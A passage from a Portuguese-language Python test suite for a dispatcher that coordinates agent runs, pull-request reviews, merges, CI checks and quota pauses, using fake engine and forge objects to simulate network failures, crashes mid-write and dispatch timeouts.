            self.assertEqual(despachante.main(["iniciar", "--spec", "docs/spec.md"], ambiente=ambiente, construir=lambda a: self.novo(), saida=saida), 0)
            saidas.append(saida.getvalue())
        self.assertNotIn("spec já iniciada", saidas[0])
        self.assertIn("spec já iniciada", saidas[1])
        self.assertEqual(len(self.runs(FABLE)), 1)


# ---------------------------------------------------------------- rodada 2 (N1, I1–I5, J, K, L1–L9)


class MotorForaDoAr(motor.MotorFalso):
    """Com `fora`, toda chamada falha na camada de rede (o Warren caiu)."""

    fora = False

    def _talvez(self, nome, **argumentos):
        if self.fora:
            self._registrar(nome, **argumentos)
            raise motor.FalhaDeRede("GET /x: falha de rede (ConnectionRefusedError)")

    def run(self, run_id):
        self._talvez("run", run_id=run_id)
        return super().run(run_id)

    def plano(self, plan_run_id):
        self._talvez("plano", plan_run_id=plan_run_id)
        return super().plano(plan_run_id)

    def despachar_run(self, **argumentos):
        self._talvez("despachar_run", **argumentos)
        return super().despachar_run(**argumentos)

    def despachar_plano(self, **argumentos):
        self._talvez("despachar_plano", **argumentos)
        return super().despachar_plano(**argumentos)

    def ultimo_texto(self, run_id):
        self._talvez("ultimo_texto", run_id=run_id)
        return super().ultimo_texto(run_id)

    def modelo_efetivo(self, run_id):
        self._talvez("modelo_efetivo", run_id=run_id)
        return super().modelo_efetivo(run_id)


class TestesRodada2(Base):
    # ------------------------------------------------ I1
    def test_i1_queda_curta_do_warren_nao_escala_a_seed(self):
        self.motor = MotorForaDoAr()
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        rid = self.estado()["seeds"]["s-1"]["revisaoRunId"]
        self.motor.fora = True
        for _ in range(5):
            d.ciclo()
        self.motor.fora = False
        for _ in range(3):
            d.ciclo()
        seed = self.estado()["seeds"]["s-1"]
        self.assertEqual((seed["estado"], seed["revisaoRunId"], seed["pendenteHumano"]), ("em_revisao", rid, None))
        abertas = [t for u, t in zip(self.forja._decisoes, [t for t, _ in self.forja.decisoes]) if not self.forja._decisoes[u]["fechada"]]
        self.assertEqual(abertas, [])
        self.assertEqual([t for t, _ in self.forja.decisoes], ["[fábrica] Warren inacessível"])
        self.terminar_revisao(H1)  # o run original termina bem e ainda é observado
        d.ciclo()
        self.assertEqual(self.forja.merges, [(PR, H1)])
        self.assertEqual(len(self.runs(OPUS)), 1)

    def test_i1_queda_longa_mantem_orquestrador_e_fixer_originais(self):
        self.motor = MotorForaDoAr()
        d, orq = self.acordar_por_falha(plano(raia("a"), raia("b", plano_seeds="pl-000b")))
        self.motor.definir_plano("plano-2", "running", [{"seedId": "s-b", "estado": "pr_open", "runId": "rb", "prUrl": PR}])
        self.forja.definir_pr(PR, head_sha=H1, branch="warren/s-b", arquivos=["src/b/x.ts"])
        self.forja.definir_ci(REPO, H1, "vermelho")
        d.ciclo()
        rid = self.estado()["seeds"]["s-b"]["revisaoRunId"]
        self.motor.definir_run(rid, estado="succeeded")
        self.motor.definir_texto(rid, veredito_texto(H1))
        d.ciclo()
        fixer = self.estado()["seeds"]["s-b"]["fixerRunId"]
        self.assertTrue(fixer)
        self.motor.fora = True
        for _ in range(12):
            d.ciclo()
        e = self.estado()
        self.assertEqual((e["orquestrador"]["runId"], e["seeds"]["s-b"]["fixerRunId"]), (orq, fixer))
        self.assertIsNone(e["pausado"])
        self.assertNotIn(e["seeds"]["s-b"]["estado"], ("falhou", "bloqueada_humano"))
        self.motor.fora = False
        self.motor.definir_run(orq, estado="succeeded")  # termina sem PR: segue o fluxo normal
        self.motor.definir_run(fixer, estado="succeeded")
        for _ in range(3):
            d.ciclo()
        self.assertNotEqual(self.estado()["orquestrador"]["runId"], orq)
        self.assertIsNone(self.estado()["seeds"]["s-b"]["fixerRunId"])
        self.assertIsNone(self.estado()["warrenFora"]["url"])

    def test_i1_despacho_com_falha_de_rede_e_adiado(self):
        class MotorRedeInstavel(motor.MotorFalso):
            falhas = 1

            def despachar_plano(self, **argumentos):
                if self.falhas:
                    self.falhas -= 1
                    self._registrar("despachar_plano", **argumentos)
                    raise motor.FalhaAntesDoEnvio("POST /plan-runs: falha de rede (ConnectionRefusedError)")
                return super().despachar_plano(**argumentos)

        self.motor = MotorRedeInstavel()
        self.publicar(plano(raia("a")))
        d = self.novo()
        d.iniciar()
        d.ciclo()
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "planejada")
        d.ciclo()
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "executando")
        linha = [x for x in self.log() if x.get("evento") == "acao"][0]
        self.assertEqual(linha["resultado"], {"adiado": True, "rede": True})

    # ------------------------------------------------ I2: queda em cada gravação
    def _queda_em_cada_gravacao(self, preparar, agir, verificar, maximo=14):
        original = despachante.gravar_json_atomico
        for modo in ("antes", "depois"):
            for k in range(1, maximo + 1):
                with self.subTest(modo=modo, k=k):
                    self.setUp()
                    ctx = preparar()
                    contagem = {"n": 0}

                    def gravar(caminho, dados, _k=k, _modo=modo):
                        if pathlib.Path(caminho).name == "estado.json":
                            contagem["n"] += 1
                            if contagem["n"] == _k:
                                if _modo == "depois":
                                    original(caminho, dados)
                                raise KeyboardInterrupt
                        return original(caminho, dados)

                    with mock.patch.object(despachante, "gravar_json_atomico", side_effect=gravar):
                        try:
                            agir(ctx)
                        except KeyboardInterrupt:
                            pass
                    outro = self.novo()
                    for _ in range(3):
                        outro.ciclo()
                    verificar(ctx)

    def _abertas(self, trecho):
        return [u for u, (t, _) in zip(self.forja._decisoes, self.forja.decisoes) if trecho in t and not self.forja._decisoes[u]["fechada"]]

    def test_i2_aguardar_humano_sem_perda_nem_duplicata(self):
        def preparar():
            d = self.preparar_raia()
            self.abrir_pr(H1, arquivos=("db/migrations/1.sql",))
            d.ciclo()
            self.terminar_revisao(H1)
            return d

        def verificar(_):
            abertas = self._abertas("s-1: decisão")
            self.assertEqual(len(abertas), 1)
            self.assertEqual([x["url"] for x in self.estado()["decisoes"] if x["alvo"] == "s-1"], abertas)
            self.assertEqual(self.estado()["seeds"]["s-1"]["estado"], "bloqueada_humano")
            self.assertEqual(self.estado()["decisoesPendentes"], [])

        self._queda_em_cada_gravacao(preparar, lambda d: d.ciclo(), verificar)

    def test_i2_issue_de_pausa_sem_perda_nem_duplicata(self):
        def preparar():
            d = self.preparar_raia()
            self.abrir_pr(H1)
            d.ciclo()
            rid = self.estado()["seeds"]["s-1"]["revisaoRunId"]
            self.motor.definir_run(rid, estado="failed", motivoFalha="provider_error")
            self.motor.definir_texto(rid, "quota reached")
            return d

        def verificar(_):
            abertas = self._abertas("despachante pausado")
            self.assertEqual(len(abertas), 1)
            self.assertEqual(self.estado()["decisaoPausa"]["url"], abertas[0])

        self._queda_em_cada_gravacao(preparar, lambda d: d.ciclo(), verificar)

    def test_i2_issue_de_bloqueio_sem_perda_nem_duplicata(self):
        def preparar():
            d, rid = self.acordar_por_falha()
            self.motor.definir_run(rid, estado="succeeded")
            d.ciclo()
            self.motor.definir_run(self.orquestrador()["runId"], estado="succeeded")
            return d

        def verificar(_):
            abertas = self._abertas("sem plano válido")
            self.assertEqual(len(abertas), 1)
            self.assertEqual(self.orquestrador()["bloqueio"]["url"], abertas[0])
            self.assertIn(abertas[0], [x["url"] for x in self.estado()["decisoes"]])
            self.assertEqual(len(self.runs(FABLE)), 2)

        self._queda_em_cada_gravacao(preparar, lambda d: d.ciclo(), verificar)


    def test_i1_falha_de_rede_de_um_run_nunca_conta_para_ele(self):
        class MotorRedeNoRun(motor.MotorFalso):
            alvo = None

            def run(self, run_id):
                if run_id == self.alvo:
                    self._registrar("run", run_id=run_id)
                    raise motor.FalhaDeRede("GET /runs/x: falha de rede (TimeoutError)")
                return super().run(run_id)

        self.motor = MotorRedeNoRun()
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        rid = self.estado()["seeds"]["s-1"]["revisaoRunId"]
        self.motor.alvo = rid
        for _ in range(8):
            d.ciclo()
        self.assertEqual(self.estado()["seeds"]["s-1"]["revisaoRunId"], rid)
        self.assertEqual(len(self.runs(OPUS)), 1)

    def test_i1_sem_nenhuma_leitura_boa_nada_vira_failed(self):
        self.motor = MotorLeituraFalha()
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        rid = self.estado()["seeds"]["s-1"]["revisaoRunId"]
        self.motor.todos = True  # HTTP 500 em tudo: nenhuma leitura deu certo
        for _ in range(8):
            d.ciclo()
        self.assertEqual(self.estado()["seeds"]["s-1"]["revisaoRunId"], rid)
        self.assertEqual(len(self.runs(OPUS)), 1)
        self.assertEqual([t for t, _ in self.forja.decisoes], ["[fábrica] Warren inacessível"])

    def test_i2_intencao_de_pausa_obsoleta_fecha_a_issue_achada(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        rid = self.estado()["seeds"]["s-1"]["revisaoRunId"]
        self.motor.definir_run(rid, estado="failed", motivoFalha="provider_error")
        self.motor.definir_texto(rid, "quota reached")
        original = d._registrar_intencao

        def cair(*a, **k):
            raise KeyboardInterrupt

        d._registrar_intencao = cair
        with self.assertRaises(KeyboardInterrupt):
            d.ciclo()  # a issue de pausa foi aberta; o registro, não
        (url,) = self._abertas("despachante pausado")
        despachante.retomar(self.raiz)  # a pausa acabou por outro caminho antes do reinício
        outro = self.novo()
        outro.ciclo()
        self.assertTrue(self.forja.decisao(url)["fechada"])
        self.assertEqual(self.estado()["decisoesPendentes"], [])
        self.assertIsNone(self.estado().get("decisaoPausa"))
        del original

    def test_i5_prs_das_seeds_tiradas_pelo_replanejamento_de_raia_falha_sao_fechados(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.motor.definir_plano("plano-1", "failed", [{"seedId": "s-1", "estado": "pr_open", "runId": "run-filho", "prUrl": PR}], falha="run_failed")
        d.ciclo()
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "falhou")
        self.publicar(plano(raia("a", plano_seeds="pl-00b2")))
        self.motor.definir_run(self.orquestrador()["runId"], estado="succeeded", prUrl=PR_ORQ)
        self.forja.definir_pr(PR_ORQ, head_sha=H3, branch="warren/orq", arquivos=[".fabrica/plano.json"])
        self.forja.definir_ci(REPO, H3, "verde")
        self.publicar(plano(raia("a", plano_seeds="pl-00b2")), ref=H3)
        d.ciclo()
        d.ciclo()
        self.assertNotIn("s-1", self.estado()["seeds"])
        self.assertIn(PR, [u for u, _ in self.forja.fechados])

    # ------------------------------------------------ I3
    def test_i3_substituicao_pendente_segura_gates_e_retomar_da_tentativa_antiga(self):
        class MotorCancelaLotado(motor.MotorFalso):
            recusas = 4

            def cancelar_plano(self, plan_run_id):
                if self.recusas:
                    self.recusas -= 1
                    self._registrar("cancelar_plano", plan_run_id=plan_run_id)
                    raise motor.MotorOcupado(30)
                return super().cancelar_plano(plan_run_id)

        self.motor = MotorCancelaLotado()
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.publicar(plano(raia("a", plano_seeds="pl-00b2")))
        self.terminar_revisao(H1)
        d.estado["raias"]["a"]["retomar"] = True
        d._salvar()
        revisoes = len(self.runs(OPUS))
        for _ in range(4):
            acoes = d.ciclo()
            self.assertFalse([a for a in acoes if a["tipo"] in ("mergear", "revisar", "verificar", "corrigir", "retomar_raia")])
        self.assertEqual(self.forja.merges, [])
        self.assertEqual(len(self.runs(OPUS)), revisoes)
        self.assertNotIn("retomar_plano", [n for n, _ in self.motor.chamadas])
        self.assertEqual(len([n for n, _ in self.motor.chamadas if n == "cancelar_plano"]), 4)
        d.ciclo()
        self.assertEqual(self.planos_despachados()[-1]["plano_seeds"], "pl-00b2")
        self.assertEqual(self.forja.merges, [])

    # ------------------------------------------------ I4
    def test_i4_bloqueio_fechado_sem_comentario_acorda_com_resposta_vazia(self):
        d, _ = self.acordar_por_falha()
        for _ in range(3):
            rid = self.orquestrador()["runId"]
            if rid:
                self.motor.definir_run(rid, estado="succeeded")
            d.ciclo()
        url = self.orquestrador()["bloqueio"]["url"]
        n = len(self.runs(FABLE))
        self.forja.definir_decisao(url, fechada=True)
        d.ciclo()
        self.assertIsNone(self.orquestrador()["bloqueio"])
        self.assertEqual(len(self.runs(FABLE)), n + 1)
        ultimo = self.runs(FABLE)[-1]["prompt"]
        self.assertIn("Motivo: resposta_paulo", ultimo)
        self.assertIn('"resposta": ""', ultimo)

    # ------------------------------------------------ I5
    def test_i5_seed_reaproveitada_pelo_plano_novo_e_revisada(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.publicar(plano(raia("a", plano_seeds="pl-00b2")))
        d.ciclo()
        novo_plan_run = self.estado()["raias"]["a"]["planRunId"]
        pr7 = "https://github.com/dono/cliente/pull/77"
        self.motor.definir_plano(novo_plan_run, "running", [{"seedId": "s-1", "estado": "pr_open", "runId": "ra2", "prUrl": pr7}])
        self.forja.definir_pr(pr7, head_sha=H2, branch="warren/s-1-2", arquivos=["src/a/x.ts"])
        self.forja.definir_ci(REPO, H2, "verde")
        d.ciclo()
        self.assertEqual(self.runs(OPUS)[-1]["branch_existente"], "warren/s-1-2")
        self.assertEqual(self.estado()["seeds"]["s-1"]["pr"], pr7)

    # ------------------------------------------------ J
    def test_p2_cota_num_filho_pausa_e_o_retomar_despacha_um_plan_run_novo(self):
        class MotorResume409(motor.MotorFalso):
            """Como o Warren (resume.ts): só merge timeouts podem ser retomados."""

            def retomar_plano(self, plan_run_id):
                self._registrar("retomar_plano", plan_run_id=plan_run_id)
                plano_ = self._planos[plan_run_id]
                if plano_["estado"] != "failed" or plano_.get("falha") not in ("child_pr_merge_timeout", "parent_pr_merge_timeout"):
                    raise RuntimeError("POST /plan-runs/%s/resume: HTTP 409" % plan_run_id)
                plano_["estado"] = "running"

        self.motor = MotorResume409()
        d = self.preparar_raia()
        self.motor.definir_plano(
            "plano-1", "failed", [{"seedId": "s-1", "estado": "failed", "runId": "rf", "falha": "provider_error"}], falha="child_failed"
        )
        self.motor.definir_texto("rf", "API Error: usage limit reached")
        d.ciclo()
        e = self.estado()
        self.assertEqual(e["pausado"], "cota")
        self.assertEqual((e["raias"]["a"]["estado"], e["raias"]["a"]["aguardandoCota"]), ("executando", True))
        self.assertEqual(self.runs(FABLE), [])
        d.ciclo()
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "executando")
        self.forja.definir_decisao(self.estado()["decisaoPausa"]["url"], fechada=True)
        d.ciclo()
        self.assertNotIn("retomar_plano", [n for n, _ in self.motor.chamadas])
        self.assertEqual([x["plano_seeds"] for x in self.planos_despachados()], ["pl-000a", "pl-000a"])
        raia_a = self.estado()["raias"]["a"]
        self.assertEqual((raia_a["estado"], raia_a["planRunId"]), ("executando", "plano-2"))
        self.assertNotIn("aguardandoCota", raia_a)
        self.assertEqual(self.estado()["cotaFilhos"], [])
        self.assertEqual(self.runs(FABLE), [])

    def test_j_falha_de_provedor_que_nao_e_cota_segue_o_caminho_normal(self):
        d = self.preparar_raia()
        self.motor.definir_plano(
            "plano-1", "failed", [{"seedId": "s-1", "estado": "failed", "runId": "rf", "falha": "provider_error"}], falha="child_failed"
        )
        self.motor.definir_texto("rf", "Internal server error")
        d.ciclo()
        self.assertIsNone(self.estado()["pausado"])
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "falhou")

    # ------------------------------------------------ K
    def test_k_ci_ausente_no_pr_do_orquestrador_mergeia(self):
        d, rid = self.acordar_por_falha()
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a", plano_seeds="pl-00aa")), ci="ausente")
        d.ciclo()
        self.assertEqual(self.forja.merges, [(PR_ORQ, H3)])

    # ------------------------------------------------ L1, L2
    def test_l1_queda_depois_do_cancelamento_nao_acorda_o_orquestrador(self):
        class MotorQueCaiNoCancelar(motor.MotorFalso):
            cair = True

            def cancelar_plano(self, plan_run_id):
                super().cancelar_plano(plan_run_id)
                if self.cair:
                    self.cair = False
                    raise KeyboardInterrupt

        self.motor = MotorQueCaiNoCancelar()
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.publicar(plano(raia("a", plano_seeds="pl-00b2")))
        with self.assertRaises(KeyboardInterrupt):
            d.ciclo()
        outro = self.novo()
        outro.ciclo()
        outro.ciclo()
        self.assertEqual(self.runs(FABLE), [])
        self.assertEqual(self.planos_despachados()[-1]["plano_seeds"], "pl-00b2")
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "executando")
        self.assertEqual(len([c for c in self.motor.chamadas if c[0] == "cancelar_plano"]), 1)

    def test_l2_seed_com_pr_ja_mergeado_fica_mergeada_na_substituicao(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.forja.definir_pr(PR, head_sha=H1, branch="warren/s-1", arquivos=["src/a/x.ts"], aberto=False, mergeado=True)
        self.publicar(plano(raia("a", plano_seeds="pl-00b2")))
        d.ciclo()
        d.ciclo()
        self.assertEqual(self.estado()["seeds"]["s-1"]["estado"], "mergeada")
        self.assertEqual(self.forja.fechados, [])
        self.assertEqual(self.estado()["raias"]["a"]["seedsSubstituidas"], [])

    # ------------------------------------------------ L3, L4
    def test_l3_plano_invalido_com_alvo_estavel_e_resposta_na_frente(self):
        d, rid = self.acordar_por_falha()
        outra = self.forja.abrir_decisao(REPO, "t", "c")
        d.estado["decisoes"].append({"url": outra, "motivo": "pergunta", "alvo": "x"})
        d._salvar()
        self.motor.definir_run(rid, estado="succeeded")
        self.forja.definir_decisao(outra, fechada=True, ultimo_comentario="RESPOSTA")
        d.ciclo()
        self.assertIn("Motivo: resposta_paulo", self.runs(FABLE)[-1]["prompt"])
        (pendente,) = self.estado()["acordarPendentes"]
        self.assertEqual((pendente["motivo"], pendente["alvo"]), ("plano_invalido", "orquestrador"))

    def test_l3_bloqueio_tira_o_plano_invalido_da_fila(self):
        d, rid = self.acordar_por_falha(plano(raia("a"), raia("b", plano_seeds="pl-000b")))
        # o run termina sem PR no mesmo ciclo em que a raia b falha: raia_falhou:b passa na frente
        self.motor.definir_run(rid, estado="succeeded")
        self.motor.definir_plano("plano-2", "failed", [], falha="cancelado")
        d.ciclo()
        self.assertIn("Motivo: raia_falhou", self.runs(FABLE)[-1]["prompt"])
        self.assertEqual([p["motivo"] for p in self.estado()["acordarPendentes"]], ["plano_invalido"])
        self.motor.definir_run(self.orquestrador()["runId"], estado="succeeded")
        d.ciclo()
        self.assertTrue(self.orquestrador()["bloqueio"])
        self.assertEqual(self.estado()["acordarPendentes"], [])

    def test_l4_queda_depois_de_contar_nao_conta_o_mesmo_run_de_novo(self):
        d, rid = self.acordar_por_falha()
        self.motor.definir_run(rid, estado="succeeded")
        with mock.patch.object(despachante.est, "concluir_orquestrador", side_effect=KeyboardInterrupt):
            with self.assertRaises(KeyboardInterrupt):
                d.ciclo()
        outro = self.novo()
        outro.ciclo()
        self.assertEqual(self.orquestrador()["semResultadoSeguidos"], 1)
        self.assertFalse(self.orquestrador().get("bloqueio"))
        self.assertEqual(len(self.runs(FABLE)), 2)

    # ------------------------------------------------ L5, L6
    def test_l5_issue_de_pausa_sumida_e_aberta_de_novo(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        rid = self.estado()["seeds"]["s-1"]["revisaoRunId"]
        self.motor.definir_run(rid, estado="failed", motivoFalha="provider_error")
        self.motor.definir_texto(rid, "quota reached")
        d.ciclo()
        velha = self.estado()["decisaoPausa"]["url"]
        del self.forja._decisoes[velha]
        d.ciclo()
        nova = self.estado()["decisaoPausa"]["url"]
        self.assertNotEqual(nova, velha)
        self.assertFalse(self.forja.decisao(nova)["fechada"])

    def test_l6_pedido_que_nao_pode_ser_apagado_nao_e_reaplicado(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        despachante.enfileirar_pedido(self.raiz, {"comando": "retomar"})
        os.chmod(self.raiz / "entrada", 0o500)
        try:
            d.ciclo()
            rid = self.estado()["seeds"]["s-1"]["revisaoRunId"]
            self.motor.definir_run(rid, estado="failed", motivoFalha="provider_error")
            self.motor.definir_texto(rid, "quota reached")
            for _ in range(4):
                d.ciclo()
            self.assertEqual(self.estado()["pausado"], "cota")
            self.assertEqual(len(self.runs(OPUS)), 1)
            self.assertEqual(len([a for a in self.estado()["avisos"] if "não foi possível apagar o pedido" in a]), 1)
        finally:
            os.chmod(self.raiz / "entrada", 0o700)

    # ------------------------------------------------ L7, L8, L9, fuso
    def test_l7_ci_pendente_loga_o_pr_do_orquestrador_uma_vez(self):
        d, rid = self.acordar_por_falha()
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a", plano_seeds="pl-00aa")), ci="pendente")
        for minuto in range(0, 100, 15):
            self.instante = datetime.datetime(2026, 11, 3, 12, 0) + datetime.timedelta(minutes=minuto)
            d.ciclo()
        self.assertEqual(len([x for x in self.log() if x.get("evento") == "pr_do_orquestrador"]), 1)

    def test_ci_pendente_com_data_de_fuso_misturado_nao_quebra(self):
        d, rid = self.acordar_por_falha()
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a", plano_seeds="pl-00aa")), ci="pendente")
        d.ciclo()
        d.estado["orquestrador"]["ciPendenteDesde"] = "2026-11-03T12:00:00+00:00"
        d._salvar()
        d.ciclo()
        self.assertEqual(self.orquestrador()["runId"], rid)
        self.assertNotIn("falhasTratar", self.orquestrador())
        self.assertEqual(self.forja.decisoes, [])

    def test_l8_rodar_recarrega_o_estado_depois_de_tomar_a_trava(self):
        self.publicar(plano(raia("a")))
        primeiro = self.novo()
        primeiro.iniciar()
        segundo = self.novo()  # construído antes do ciclo do primeiro
        primeiro.ciclo()
        segundo.rodar(intervalo=1, ciclos=1, dormir=lambda s: None)
        self.assertEqual(len(self.planos_despachados()), 1)

    def test_l9_decisao_do_pr_substituido_e_fechada(self):
        d, rid = self.acordar_por_falha(plano(raia("a"), raia("b", plano_seeds="pl-000b")))
        self.pr_do_orquestrador(rid, [".fabrica/plano.json", "README.md"], plano(raia("a"), raia("b", plano_seeds="pl-000b")))
        d.ciclo()
        (decisao,) = [x for x in self.estado()["decisoes"] if x["alvo"] == PR_ORQ]
        self.motor.definir_plano("plano-2", "failed", [], falha="cancelado")
        d.ciclo()
        novo = "https://github.com/dono/cliente/pull/91"
        self.pr_do_orquestrador(
            self.orquestrador()["runId"], [".fabrica/plano.json"], plano(raia("a"), raia("b", plano_seeds="pl-00bb")), head=H2, url=novo
        )
        d.ciclo()
        d.ciclo()
        self.assertEqual(self.forja.merges, [(novo, H2)])
        self.assertTrue(self.forja.decisao(decisao["url"])["fechada"])
        self.assertNotIn(decisao["url"], [x["url"] for x in self.estado()["decisoes"]])
        n = len(self.runs(FABLE))
        self.forja.definir_decisao(decisao["url"], fechada=True, ultimo_comentario="pode mergear o 90")
        d.ciclo()
        self.assertEqual(len(self.runs(FABLE)), n)


# ---------------------------------------------------------------- rodada 3 (P1–P10)


class MotorTimeoutDepoisDeAceitar(motor.MotorFalso):
    """As próximas `vezes` chamadas de `nome` criam o run e depois levantam FalhaIncerta."""

    def __init__(self, nome, vezes, criar=True):
        super().__init__()
        self.nome, self.vezes, self.criar = nome, vezes, criar

    def _talvez(self, nome, original, **argumentos):
        if nome == self.nome and self.vezes > 0:
            self.vezes -= 1
            if self.criar:
                original(**argumentos)
            else:
                self._registrar(nome, **argumentos)
            raise motor.FalhaIncerta("POST /x: falha de rede (TimeoutError)")
        return original(**argumentos)

    def despachar_run(self, **argumentos):
        return self._talvez("despachar_run", super().despachar_run, **argumentos)

    def despachar_plano(self, **argumentos):
        return self._talvez("despachar_plano", super().despachar_plano, **argumentos)


class TestesRodada3(Base):
    # ------------------------------------------------ P1
    def _revisoes_com_timeout(self, vezes, criar=True):
        self.motor = MotorTimeoutDepoisDeAceitar("despachar_run", vezes, criar)
        d = self.preparar_raia()
        self.abrir_pr(H1)
        for _ in range(min(vezes, 20) + 4):
            d.ciclo()
        return d

    def test_p1_timeout_depois_de_aceitar_nao_duplica_a_revisao(self):
        for vezes in (1, 20):
            with self.subTest(vezes=vezes):
                self.setUp()
                self._revisoes_com_timeout(vezes)
                criados = [r for r in self.motor._runs if r.startswith("run-")]
                self.assertEqual(len(criados), 1)
                self.assertEqual(self.estado()["seeds"]["s-1"]["revisaoRunId"], criados[0])
                self.assertEqual(self.estado()["despachosIncertos"], [])

    def test_p1_timeout_no_plan_run_e_no_orquestrador_nao_duplica(self):
        self.motor = MotorTimeoutDepoisDeAceitar("despachar_plano", 20)
        self.publicar(plano(raia("a")))
        d = self.novo()
        d.iniciar()
        for _ in range(4):
            d.ciclo()
        self.assertEqual(list(self.motor._planos), ["plano-1"])
        self.assertEqual(self.estado()["raias"]["a"]["planRunId"], "plano-1")
        self.setUp()
        self.motor = MotorTimeoutDepoisDeAceitar("despachar_run", 20)
        self.forja.definir_arquivo(REPO, "main", "docs/spec.md", "# spec")
        d = self.novo()
        d.iniciar(spec="docs/spec.md")
        for _ in range(4):
            d.ciclo()
        self.assertEqual(len([r for r in self.motor._runs if r.startswith("run-")]), 1)
        self.assertEqual(self.estado()["orquestrador"]["acordada"]["motivo"], "nova_spec")
        self.assertEqual(len(self.acordadas()), 1)

    def test_p1_incerto_nao_achado_em_3_ciclos_e_redespachado_com_nonce_novo(self):
        self.motor = MotorTimeoutDepoisDeAceitar("despachar_run", 1, criar=False)
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()  # o POST da revisão falha depois do envio
        for _ in range(2):
            d.ciclo()  # procurado e não achado: nada de novo despacho ainda
            self.assertEqual(len(self.runs(OPUS)), 1)
        self.instante += despachante.PISO_PARA_DESISTIR  # F6: e só depois do piso de 5 min
        d.ciclo()  # 3ª busca sem achar: descartado e redespachado com nonce novo
        d.ciclo()
        revisoes = self.runs(OPUS)
        self.assertEqual(len(revisoes), 2)
        nonces = [r["prompt"].rsplit("nonce=", 1)[1][:32] for r in revisoes]
        self.assertNotEqual(nonces[0], nonces[1])
        self.assertTrue(self.estado()["seeds"]["s-1"]["revisaoRunId"])

    def test_p1_orquestrador_incerto_segura_qualquer_outra_acordada(self):
        self.motor = MotorTimeoutDepoisDeAceitar("despachar_run", 1, criar=False)
        self.publicar(plano(raia("a")))
        self.forja.definir_arquivo(REPO, "main", "docs/spec.md", "# spec")
        d = self.novo()
        d.iniciar()
        d.ciclo()
        d.iniciar(spec="docs/spec.md")  # o acordar nova_spec fica incerto
        self.assertTrue(self.estado()["despachosIncertos"])
        outra = self.forja.abrir_decisao(REPO, "t", "c")
        d.estado["decisoes"].append({"url": outra, "motivo": "pergunta", "alvo": "x"})
        d._salvar()
        self.forja.definir_decisao(outra, fechada=True, ultimo_comentario="resposta")  # resposta_paulo na fila
        self.motor.definir_plano("plano-1", "failed", [], falha="cancelado")  # raia_falhou do proximas_acoes
        for _ in range(2):
            d.ciclo()
            self.assertEqual(len(self.runs(FABLE)), 1)  # só o incerto, nenhum outro orquestrador
        self.instante += despachante.PISO_PARA_DESISTIR  # F6: o incerto só sai depois do piso de 5 min
        for _ in range(3):
            d.ciclo()
        self.assertGreaterEqual(len(self.runs(FABLE)), 2)

    def test_p1_falha_antes_do_envio_repetida_pausa_com_issue(self):
        class MotorRecusa(motor.MotorFalso):
            def despachar_run(self, **argumentos):
                self._registrar("despachar_run", **argumentos)
                raise motor.FalhaAntesDoEnvio("POST /runs: falha de rede (ConnectionRefusedError)")

        self.motor = MotorRecusa()
        d = self.preparar_raia()
        self.abrir_pr(H1)
        for _ in range(12):
            d.ciclo()
        self.assertEqual(self.estado()["pausado"], "Warren rejeitando despachos")
        self.assertEqual(len(self.runs(OPUS)), 10)
        self.assertIn("[fábrica] despachante pausado: Warren rejeitando despachos", [t for t, _ in self.forja.decisoes])

    # ------------------------------------------------ P2
    def test_p2_texto_do_filho_ilegivel_nao_falha_a_raia(self):
        class MotorTextoInstavel(motor.MotorFalso):
            falhas = 1

            def ultimo_texto(self, run_id):
                if self.falhas:
                    self.falhas -= 1
                    raise motor.FalhaIncerta("GET /runs/x/events: falha de rede (TimeoutError)")
                return super().ultimo_texto(run_id)

        self.motor = MotorTextoInstavel()
        d = self.preparar_raia()
        self.motor.definir_plano(
            "plano-1", "failed", [{"seedId": "s-1", "estado": "failed", "runId": "rf", "falha": "provider_error"}], falha="child_failed"
        )
        self.motor.definir_texto("rf", "usage limit reached")
        d.ciclo()
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "executando")
        self.assertEqual(self.runs(FABLE), [])
        d.ciclo()
        self.assertEqual(self.estado()["pausado"], "cota")
        self.assertTrue(self.estado()["raias"]["a"]["aguardandoCota"])

    def test_p2_cota_de_novo_no_plan_run_novo_pausa_de_novo(self):
        d = self.preparar_raia()
        self.motor.definir_plano("plano-1", "failed", [{"seedId": "s-1", "estado": "failed", "runId": "rf", "falha": "provider_error"}], falha="child_failed")
        self.motor.definir_texto("rf", "usage limit reached")
        d.ciclo()
        self.forja.definir_decisao(self.estado()["decisaoPausa"]["url"], fechada=True)
        d.ciclo()
        novo = self.estado()["raias"]["a"]["planRunId"]
        self.motor.definir_plano(novo, "failed", [{"seedId": "s-1", "estado": "failed", "runId": "rf2", "falha": "provider_error"}], falha="child_failed")
        self.motor.definir_texto("rf2", "quota reached")
        d.ciclo()
        self.assertEqual(self.estado()["pausado"], "cota")
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "executando")

    # ------------------------------------------------ P3, P9
    def test_p3_seed_reaproveitada_ganha_chave_e_decisao_novas(self):
        d = self.preparar_raia()
        self.abrir_pr(H1, arquivos=("src/auth/x.ts",))
        d.ciclo()
        self.terminar_revisao(H1)
        d.ciclo()
        (antiga,) = self.estado()["decisoes"]
        d.estado["chavesAcordadas"].append("gate_falhou_apos_fixer:s-1")
        d._salvar()
        self.publicar(plano(raia("a", plano_seeds="pl-00b2")))
